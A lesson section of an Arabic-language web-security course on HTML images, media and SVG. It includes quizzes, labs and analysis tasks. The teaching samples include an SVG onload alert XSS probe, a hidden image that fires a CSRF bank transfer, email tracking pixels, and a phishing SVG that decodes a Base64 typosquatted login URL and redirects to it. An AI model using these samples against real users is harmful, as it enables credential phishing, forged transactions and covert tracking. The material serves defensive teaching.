@@ -1,0 +1,312 @@
+      <section class="section" id="s06" data-part="الجزء 1 · HTML" data-pk="html" data-nav="الصور والوسائط وSVG" data-icon="🖼️" data-keywords="img src alt width height loading lazy srcset sizes picture source figure figcaption audio video track vtt autoplay muted poster svg inline foreignobject image map area data uri base64 tracking pixel onerror svg xss phishing">
+        <div class="section-head">
+          <span class="section-index">06</span>
+          <div>
+            <p class="eyebrow">HTML · الدرس 06</p>
+            <h2>الصور والوسائط وSVG</h2>
+            <p class="lede">صورة واحدة في صفحة = request أوتوماتيك بيطلع من متصفح الزائر من غير ما يدوس على حاجة. الحقيقة البسيطة دي ورا <b>tracking pixels</b> في الإيميلات، وCSRF بالـ GET، وأشهر payload XSS في التاريخ (<code>onerror</code>). وفي الآخر <b>SVG</b>: «صورة» هي في الحقيقة مستند فيه scripts — وبقت من أشهر مرفقات الـ phishing.</p>
+          </div>
+        </div>
+
+        <h3 class="sub">الـ <code>&lt;img&gt;</code></h3>
+        <html-example file="img.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>img</title></head>
+          <body>
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='60'%3E%3Crect width='120' height='60' rx='10' fill='%23ff7a45'/%3E%3Ctext x='60' y='38' font-size='20' text-anchor='middle' fill='white' font-family='sans-serif'%3ELOGO%3C/text%3E%3C/svg%3E"
+                 alt="Shop logo" width="120" height="60">
+            <br>
+            <img src="missing-screenshot.png" alt="Screenshot of the admin login page" width="320" height="40">
+            <script>
+              document.images[1].addEventListener("error", () => console.log("image 2 failed → the browser shows its alt text"));
+            </script>
+          </body>
+          </html>
+        </html-example>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>الـ attribute</th><th>وظيفته</th></tr></thead>
+          <tbody>
+            <tr><td><code>src</code></td><td>مكان الصورة (URL — absolute أو relative أو <code>data:</code>)</td></tr>
+            <tr><td><code>alt</code></td><td><b>بديل نصي</b>: بيظهر لو الصورة فشلت، وقارئ الشاشة بيقراه، ومحركات البحث بتفهم منه. للصور الزخرفية: <code>alt=""</code> (فاضي) عشان قارئ الشاشة يتجاهلها</td></tr>
+            <tr><td><code>width</code> / <code>height</code></td><td>أبعاد بالـ pixels (من غير <code>px</code>). بيخلّي المتصفح يحجز المكان قبل ما الصورة تيجي فالصفحة متتنططش (layout shift)</td></tr>
+            <tr><td><code>loading="lazy"</code></td><td>متحمّلش الصورة غير لما تقرب من الشاشة</td></tr>
+            <tr><td><code>decoding="async"</code></td><td>فك الصورة من غير ما يعطّل باقي الصفحة</td></tr>
+            <tr><td><code>srcset</code> + <code>sizes</code></td><td>نسخ بأحجام مختلفة والمتصفح يختار المناسب للشاشة</td></tr>
+            <tr><td><code>referrerpolicy</code> / <code>crossorigin</code></td><td>يتحكم في الـ Referer اللي يتبعت / وضع الـ CORS للطلب</td></tr>
+          </tbody>
+        </table></div>
+        <div class="callout info reveal"><span class="ci">🗂️</span><div><strong>الصيغ</strong><p><b>JPEG</b> للصور الفوتوغرافية، <b>PNG</b> للي فيها شفافية أو نص حاد، <b>GIF</b> للأنيميشن القديم، <b>WebP</b> و<b>AVIF</b> صيغ حديثة أصغر بكتير، و<b>SVG</b> vector بيتكبّر من غير ما يبوظ (لوجوهات وأيقونات). المتصفح بيعرف الصيغة من الـ <code>Content-Type</code> ومن الـ «magic bytes» في أول الملف — مش من الامتداد.</p></div></div>
+
+        <h3 class="sub">srcset وsizes و&lt;picture&gt;</h3>
+        <code-block lang="html" file="responsive.html">
+          <!-- same image, different resolutions: the browser picks -->
+          <img src="hero-800.jpg"
+               srcset="hero-400.jpg 400w, hero-800.jpg 800w, hero-1600.jpg 1600w"
+               sizes="(max-width: 600px) 100vw, 800px"
+               alt="Dashboard overview" width="800" height="450">
+
+          <!-- different formats / art direction: first matching <source> wins -->
+          <picture>
+            <source type="image/avif" srcset="hero.avif">
+            <source type="image/webp" srcset="hero.webp">
+            <source media="(max-width: 600px)" srcset="hero-mobile.jpg">
+            <img src="hero.jpg" alt="Dashboard overview" width="800" height="450">
+          </picture>
+        </code-block>
+        <p>في <code>&lt;picture&gt;</code> المتصفح بيمشي على الـ <code>source</code> بالترتيب وبياخد <b>أول</b> واحد يناسبه (صيغة يدعمها، media query صح)، والـ <code>&lt;img&gt;</code> في الآخر إجباري — هو اللي بيتعرض فعلًا وعليه الـ <code>alt</code>.</p>
+
+        <h3 class="sub">figure وfigcaption</h3>
+        <p><code>&lt;figure&gt;</code> = محتوى مستقل (صورة، diagram، كود، جدول) بيتشار له من النص، و<code>&lt;figcaption&gt;</code> شرحه. ممتاز للـ screenshots في التقارير:</p>
+        <html-example file="figure.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>figure</title>
+          <style>figure{border:1px solid #cbd5e1;border-radius:10px;padding:10px;max-width:320px;font-family:system-ui}figcaption{font-size:13px;color:#475569}</style></head>
+          <body>
+            <figure>
+              <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='80'%3E%3Crect width='300' height='80' fill='%230b1322'/%3E%3Ctext x='12' y='45' fill='%23ff7a45' font-family='monospace' font-size='15'%3Ealert(document.domain)%3C/text%3E%3C/svg%3E"
+                   alt="Alert box proving script execution" width="300" height="80">
+              <figcaption>Figure 1 — the payload executed on <code>/search</code>.</figcaption>
+            </figure>
+          </body>
+          </html>
+        </html-example>
+
+        <h3 class="sub">الصوت والفيديو</h3>
+        <code-block lang="html" file="media.html">
+          <video controls width="640" height="360" poster="thumb.jpg" preload="metadata">
+            <source src="demo.webm" type="video/webm">
+            <source src="demo.mp4" type="video/mp4">
+            <track kind="subtitles" src="demo.ar.vtt" srclang="ar" label="العربية" default>
+            Your browser does not support video. <a href="demo.mp4">Download it</a>.
+          </video>
+
+          <audio controls src="podcast.mp3"></audio>
+
+          <!-- autoplay is only allowed when muted -->
+          <video autoplay muted loop playsinline src="background.mp4"></video>
+        </code-block>
+        <ul>
+          <li><code>controls</code> بيظهر أزرار التشغيل. من غيره، الفيديو من غير تحكم.</li>
+          <li>المتصفحات بتمنع <code>autoplay</code> بصوت؛ لازم <code>muted</code>. (<code>playsinline</code> للموبايل.)</li>
+          <li><code>&lt;track&gt;</code> للترجمة بصيغة <b>WebVTT</b> (<code>.vtt</code>)، والنص اللي جوه <code>&lt;video&gt;</code> بيظهر بس للمتصفحات اللي مش بتدعمه.</li>
+          <li><code>preload="none|metadata|auto"</code>: قد إيه يحمّل مقدمًا.</li>
+        </ul>
+
+        <h3 class="sub">SVG جوه الصفحة: صورة… ومستند</h3>
+        <p>SVG (Scalable Vector Graphics) = صورة متوصفة بـ <b>markup</b> (أشكال وإحداثيات) بدل pixels. تقدر تكتبه <b>inline</b> جوه الـ HTML مباشرة، وساعتها كل شكل جواه element في الـ DOM تقدر تعمله style وتحرّكه:</p>
+        <html-example file="svg.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>SVG</title></head>
+          <body>
+            <svg width="260" height="90" viewBox="0 0 260 90" role="img" aria-label="Radar">
+              <circle cx="45" cy="45" r="38" fill="none" stroke="#ff7a45" stroke-width="3"/>
+              <circle cx="45" cy="45" r="20" fill="none" stroke="#ffb08a"/>
+              <line x1="45" y1="45" x2="80" y2="25" stroke="#b48cff" stroke-width="3">
+                <animateTransform attributeName="transform" type="rotate" from="0 45 45" to="360 45 45" dur="3s" repeatCount="indefinite"/>
+              </line>
+              <text x="100" y="52" font-family="monospace" font-size="16" fill="#0b1322">scanning…</text>
+            </svg>
+          </body>
+          </html>
+        </html-example>
+        <p>جوه <code>&lt;svg&gt;</code> الـ parser بيدخل «<b>foreign content</b>»: الـ self-closing (<code>&lt;circle/&gt;</code>) بيشتغل فعلًا، وأسماء زي <code>viewBox</code> و<code>foreignObject</code> ليها حروف كابيتال، وقواعد تانية مختلفة. 🎯 الاختلافات دي هي أساس payloads وbypasses كتير (الدرس 13).</p>
+
+        <h3 class="sub">SVG وJavaScript: إمتى بيشتغل؟</h3>
+        <p>SVG ممكن يكون فيه <code>&lt;script&gt;</code> وevent handlers زي <code>onload</code>. هل بيشتغلوا؟ <b>بيعتمد على طريقة التضمين</b>:</p>
+        <html-example file="svg-script.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>SVG scripts</title></head>
+          <body>
+            <p>1) inline SVG with a script:</p>
+            <svg width="60" height="20"><script>console.log("inline svg script RAN")</script><rect width="60" height="20" fill="#ff7a45"/></svg>
+
+            <p>2) the same idea loaded as an &lt;img&gt;:</p>
+            <img alt="svg as image" width="60" height="20"
+                 src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3Crect width='60' height='20' fill='%23b48cff'/%3E%3C/svg%3E">
+            <p>…no alert: images never run scripts.</p>
+          </body>
+          </html>
+        </html-example>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>طريقة التضمين</th><th>الـ scripts بتشتغل؟</th></tr></thead>
+          <tbody>
+            <tr><td>inline <code>&lt;svg&gt;</code> جوه الصفحة</td><td class="t-no">أيوه — في سياق الصفحة نفسها</td></tr>
+            <tr><td><code>&lt;img src="x.svg"&gt;</code> / CSS <code>background-image</code></td><td class="t-ok">لأ — الصور بتتعرض في وضع آمن من غير scripts ولا requests خارجية</td></tr>
+            <tr><td>فتح <code>x.svg</code> مباشرة في المتصفح (أو <code>&lt;iframe&gt;</code> / <code>&lt;object&gt;</code> / <code>&lt;embed&gt;</code>)</td><td class="t-no">أيوه — كمستند كامل على الـ origin بتاع الملف</td></tr>
+          </tbody>
+        </table></div>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>SVG upload = stored XSS كلاسيكي</strong><p>موقع بيسمح برفع «صورة» SVG كـ avatar ويخدمها من نفس الدومين بـ <code>Content-Type: image/svg+xml</code>. جوه الـ avatar في الصفحة (كـ <code>img</code>) مفيش مشكلة. بس لو المهاجم بعت للضحية <b>لينك الملف نفسه</b> (<code>https://shop.example/uploads/me.svg</code>)، المتصفح بيفتحه كمستند والـ script بيشتغل على <code>shop.example</code> = XSS. الحلول: تخدم الـ uploads من دومين منفصل، أو <code>Content-Disposition: attachment</code>، أو CSP على الـ uploads، أو تحويل/تنظيف الـ SVG.</p></div></div>
+        <div class="callout mal reveal"><span class="ci">🦠</span><div><strong>SVG كمرفق phishing</strong><p>من 2024 الـ SVG attachments بقت من أشهر أشكال الـ phishing: الإيميل فيه ملف <code>.svg</code>، ولما الضحية تفتحه بيتفتح في المتصفح (مش في عارض صور)، والـ JavaScript جواه بيعرض صفحة login مزيفة أو بيعمل redirect لموقع المهاجم — وكتير منه بيكون فيه الـ URL متشفّر بـ Base64. أدوات الفحص التقليدية كانت بتعامله كـ «صورة» فبيعدّي.</p></div></div>
+
+        <h3 class="sub">Image maps (للمعرفة)</h3>
+        <p><code>&lt;img usemap="#m"&gt;</code> + <code>&lt;map name="m"&gt;&lt;area shape="rect" coords="0,0,50,50" href="/a" alt="A"&gt;&lt;/map&gt;</code> بيخلّي أجزاء من صورة واحدة لينكات مختلفة. نادرة دلوقتي، بس <code>&lt;area href&gt;</code> = لينك (ممكن <code>javascript:</code> كمان).</p>
+
+        <h3 class="sub">كل صورة = request</h3>
+        <code-block lang="html" file="email.html">
+          <!-- a marketing (or phishing) email -->
+          <p>Hi Omar, your invoice is ready.</p>
+          <img src="https://mail-track.example/o.gif?id=8812&amp;c=nov-invoice" width="1" height="1" alt="">
+
+          <!-- a "CSRF via GET": an action triggered just by rendering an image -->
+          <img src="https://bank.example/transfer?to=attacker&amp;amount=1000" alt="" hidden>
+        </code-block>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>Tracking pixels وCSRF بالـ GET</strong><p>صورة 1×1 شفافة في إيميل = لما الإيميل يتفتح، برنامج الإيميل يطلب الصورة، فالمرسل يعرف <b>إن</b> الإيميل اتفتح و<b>إمتى</b> ومن أنهي IP وبأي client — والـ <code>id</code> في الـ URL بيحدد الضحية. (برامج الإيميل الحديثة بتعمل proxy للصور أو بتمنعها افتراضيًا لنفس السبب.) ونفس الآلية: لو أي endpoint بيعمل action بـ GET، أي صفحة تحط <code>&lt;img&gt;</code> بالـ URL ده هتنفّذه بالـ cookies بتاعة الضحية.</p></div></div>
+        <div class="callout mal reveal"><span class="ci">🦠</span><div><strong>Data URIs في الـ phishing kits</strong><p>صفحات الـ phishing بتحط لوجو البنك أو Microsoft كـ <code>data:image/png;base64,…</code> جوه الـ HTML بدل ما تطلبه من موقعهم — عشان (1) الـ brand ميشوفش requests غريبة لملفاته، (2) الصفحة تشتغل offline كمرفق. ككاشف: Base64 طويل جوه <code>src</code> في مرفق إيميل = علامة.</p></div></div>
+
+        <div class="exercises">
+          <div class="exercises-head"><h3><span class="bulb">✏️</span> تمارين الدرس 06</h3></div>
+          <quiz id="s06-q1" answer="2">
+            <q>صورة زخرفية بحتة (خط فاصل مرسوم). الـ `alt` المناسب؟</q>
+            <o>تشيل الـ `alt` خالص</o>
+            <o>`alt="image"`</o>
+            <o>`alt=""` (فاضي)</o>
+            <o>`alt="decorative line separator image"`</o>
+            <good>الـ `alt` الفاضي بيقول لقارئ الشاشة «تجاهلها». شيل الـ alt خالص أسوأ: بعض القارئات بتقرا اسم الملف.</good>
+            <bad>للصور الزخرفية `alt=""`. الـ alt المليان بكلام ملوش لازمة إزعاج، وغيابه بيخلّي قارئات الشاشة تقرا الـ src.</bad>
+          </quiz>
+          <quiz id="s06-q2" answer="0">
+            <q>`<img src="evil.svg">` والـ SVG فيه `<script>alert(1)</script>`. هيحصل إيه في الصفحة؟</q>
+            <o>الصورة تتعرض والـ script <b>مش</b> هيشتغل</o>
+            <o>الـ alert هيظهر</o>
+            <o>الصورة مش هتظهر</o>
+            <o>الـ script هيشتغل على origin الـ SVG</o>
+            <good>الصور (img/CSS) بتتعرض في secure mode من غير scripts. الخطر لو الـ SVG اتفتح كمستند (مباشرة، iframe، object، embed).</good>
+            <bad>المتصفح مش بيشغّل scripts جوه صور `img`. الخطر في فتح الملف نفسه كمستند.</bad>
+          </quiz>
+          <quiz id="s06-q3" answer="3">
+            <q>ليه تحط `width` و`height` على `img` حتى لو هتغيّر الحجم بالـ CSS؟</q>
+            <o>عشان الصورة تتحمّل أسرع</o>
+            <o>عشان الـ alt يشتغل</o>
+            <o>إجباري وإلا مش هتظهر</o>
+            <o>عشان المتصفح يعرف الـ aspect ratio ويحجز المكان قبل التحميل، فالصفحة متتنططش</o>
+            <good>ده بيمنع الـ layout shift (CLS). والـ CSS ممكن يغيّر الحجم وهيحافظ على النسبة.</good>
+            <bad>الأبعاد مش إجبارية، بس بتخلّي المتصفح يحسب المساحة قبل ما الصورة توصل.</bad>
+          </quiz>
+          <quiz id="s06-q4" answer="1">
+            <q>`<video autoplay src="intro.mp4">` مش بيشتغل لوحده. ليه غالبًا؟</q>
+            <o>`autoplay` مش موجودة في HTML</o>
+            <o>المتصفحات بتمنع التشغيل التلقائي بصوت — لازم `muted`</o>
+            <o>لازم `controls`</o>
+            <o>`mp4` مش مدعوم</o>
+            <good>سياسات الـ autoplay: مسموح لو `muted` (أو المستخدم اتفاعل مع الموقع قبل كده).</good>
+            <bad>`autoplay` موجودة، بس المتصفحات بتمنعها لو فيه صوت. ضيف `muted`.</bad>
+          </quiz>
+          <quiz id="s06-q5" answer="2">
+            <q>إيميل فيه `<img src="https://t.example/p.gif?u=4471" width="1" height="1">`. الغرض الأرجح؟</q>
+            <o>تحسين شكل الإيميل</o>
+            <o>صورة مكسورة بالغلط</o>
+            <o>tracking pixel: معرفة إن المستلم `4471` فتح الإيميل، وإمتى، ومن أنهي IP</o>
+            <o>حماية من الـ spam</o>
+            <good>صورة 1×1 بـ parameter بيحدد المستلم = tracking. وفي الـ phishing بيستخدم لتأكيد إن الإيميل «حي».</good>
+            <bad>صورة 1×1 مش هتبان أصلًا، والـ `u=4471` بيحدد مين اللي فتح. ده tracking pixel.</bad>
+          </quiz>
+          <quiz id="s06-q6" answer="0">
+            <q>في `<picture>` فيه 3 `<source>` واتنين منهم مناسبين للمتصفح. أنهي هيتاخد؟</q>
+            <o>أول واحد مناسب بالترتيب</o>
+            <o>آخر واحد</o>
+            <o>الأصغر في الحجم</o>
+            <o>الـ `img` دايمًا</o>
+            <good>المتصفح بيقف عند أول `source` يتطابق — فرتّبهم من الأفضل للأقل.</good>
+            <bad>الترتيب هو اللي بيحكم: أول `source` مناسب. الـ `img` fallback لو مفيش ولا واحد.</bad>
+          </quiz>
+
+          <html-lab id="s06-lab1" title="Screenshot في تقرير — صح" level="1">
+            <desc><p>حط الصورة اللي في المحرر جوه <code>figure</code> صح:</p>
+            <ul><li>الـ <code>img</code> ابن مباشر لـ <code>figure</code>، وتحته <code>figcaption</code> فيه وصف.</li>
+            <li>عليها <code>alt</code> بيوصف المحتوى (5 حروف على الأقل، ومش كلمة image).</li>
+            <li>عليها <code>width</code> و<code>height</code> بأرقام، و<code>loading="lazy"</code>.</li></ul></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Evidence</title></head>
+              <body>
+                <h2>Evidence</h2>
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='80'%3E%3Crect width='300' height='80' fill='%230b1322'/%3E%3Ctext x='12' y='45' fill='%23ff7a45' font-family='monospace' font-size='15'%3E200 OK — admin panel%3C/text%3E%3C/svg%3E">
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Evidence</title></head>
+              <body>
+                <h2>Evidence</h2>
+                <figure>
+                  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='80'%3E%3Crect width='300' height='80' fill='%230b1322'/%3E%3Ctext x='12' y='45' fill='%23ff7a45' font-family='monospace' font-size='15'%3E200 OK — admin panel%3C/text%3E%3C/svg%3E"
+                       alt="Admin panel returned 200 OK without authentication" width="300" height="80" loading="lazy">
+                  <figcaption>Figure 1 — unauthenticated access to the admin panel.</figcaption>
+                </figure>
+              </body>
+              </html>
+            </solution>
+            <test label="الـ `img` ابن مباشر لـ `figure`">has("figure > img")</test>
+            <test label="`figcaption` جوه الـ `figure` فيه نص">has("figure > figcaption") && text("figcaption").length > 3</test>
+            <test label="`alt` وصفي (5+ حروف ومش «image»)">(attr("img", "alt") || "").trim().length >= 5 && !/^(image|img|picture|photo)$/i.test((attr("img", "alt") || "").trim())</test>
+            <test label="`width` و`height` أرقام">/^\d+$/.test(attr("img", "width") || "") && /^\d+$/.test(attr("img", "height") || "")</test>
+            <test label="`loading=&quot;lazy&quot;`">attr("img", "loading") === "lazy"</test>
+          </html-lab>
+
+          <html-lab id="s06-lab2" title="ارسم بـ SVG" level="2">
+            <desc><p>اعمل <code>svg</code> inline فيه:</p>
+            <ul><li><code>viewBox="0 0 200 100"</code> (لاحظ الـ B الكابيتال).</li>
+            <li><code>circle</code> و<code>rect</code> واحد على الأقل من كل نوع.</li>
+            <li><code>text</code> مكتوب فيه <b>PWNED</b>.</li>
+            <li>الـ <code>svg</code> عليه <code>role="img"</code> و<code>aria-label</code> فيه وصف.</li></ul></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>SVG</title></head>
+              <body>
+                <!-- your svg here -->
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>SVG</title></head>
+              <body>
+                <svg width="200" height="100" viewBox="0 0 200 100" role="img" aria-label="Red badge saying PWNED">
+                  <rect x="5" y="5" width="190" height="90" rx="14" fill="#0b1322"/>
+                  <circle cx="35" cy="50" r="18" fill="#ff5c8a"/>
+                  <text x="65" y="58" font-family="monospace" font-size="24" fill="#ff7a45">PWNED</text>
+                </svg>
+              </body>
+              </html>
+            </solution>
+            <test label="`svg` عليه `viewBox=&quot;0 0 200 100&quot;`">has("svg") && $("svg").getAttribute("viewBox") === "0 0 200 100"</test>
+            <test label="فيه `circle` و`rect`">has("svg circle") && has("svg rect")</test>
+            <test label="`text` مكتوب فيه PWNED">$$("svg text").some(t => t.textContent.trim() === "PWNED")</test>
+            <test label="`role=&quot;img&quot;` و`aria-label`">attr("svg", "role") === "img" && (attr("svg", "aria-label") || "").trim().length > 3</test>
+          </html-lab>
+
+          <task id="s06-t1" title="مين اللي اتتبع؟" level="2" answer="support@shop.example">
+            <desc><p>لقيت الكود ده في آخر إيميل phishing. الـ <code>id</code> في الـ tracking pixel بيحدد الضحية. <b>إيه الإيميل المستهدف؟</b></p></desc>
+            <listing lang="html" file="mail.html">
+              <p>Your mailbox is almost full. <a href="https://mail-upgrade.example/">Upgrade now</a></p>
+              <img src="https://mail-track.example/o.gif?id=c3VwcG9ydEBzaG9wLmV4YW1wbGU=" width="1" height="1" alt="" style="display:block">
+            </listing>
+            <hint>الـ `id` شكله Base64 (حروف وأرقام وبيخلص بـ `=`). جرّب `atob("…")` في Console أو الـ Encoder (الدرس 14).</hint>
+            <explain>`c3VwcG9ydEBzaG9wLmV4YW1wbGU=` = Base64 لـ `support@shop.example`. الـ pixel بيأكد للمهاجم إن الصندوق ده حقيقي وبيتقري. في الـ incident response الـ IOC هنا: الدومينات `mail-track.example` و`mail-upgrade.example`.</explain>
+          </task>
+          <task id="s06-t2" title="مرفق SVG مشبوه" level="2" answer="https://login-microsoftonline.example/common/oauth2?client=8812">
+            <desc><p>مرفق اسمه <code>Voice_Message_0412.svg</code>. اقراه (من غير ما تفتحه في متصفح!) وقول: <b>الضحية هتتحوّل لأنهي URL؟</b></p></desc>
+            <listing lang="html" file="Voice_Message_0412.svg">
+              <svg xmlns="http://www.w3.org/2000/svg" width="400" height="120">
+                <rect width="400" height="120" fill="#f3f4f6"/>
+                <text x="20" y="65" font-family="Segoe UI" font-size="18">▶ Voice message (0:42) — loading…</text>
+                <script>
+                  var u = "aHR0cHM6Ly9sb2dpbi1taWNyb3NvZnRvbmxpbmUuZXhhbXBsZS9jb21tb24vb2F1dGgyP2NsaWVudD04ODEy";
+                  setTimeout(function () { window.location.href = atob(u); }, 1500);
+                </script>
+              </svg>
+            </listing>
+            <hint>الـ `atob` بتفك Base64. فك قيمة `u`.</hint>
+            <explain>`atob(u)` = `https://login-microsoftonline.example/common/oauth2?client=8812` — دومين شبه Microsoft (typosquatting) فيه صفحة login مزيفة. النمط: SVG + script + Base64 + redirect بعد ثانية ونص عشان «الرسالة الصوتية بتحمّل». الـ IOC: الدومين ده، والـ `client=8812` غالبًا معرّف الحملة.</explain>
+          </task>
+        </div>
+      </section>
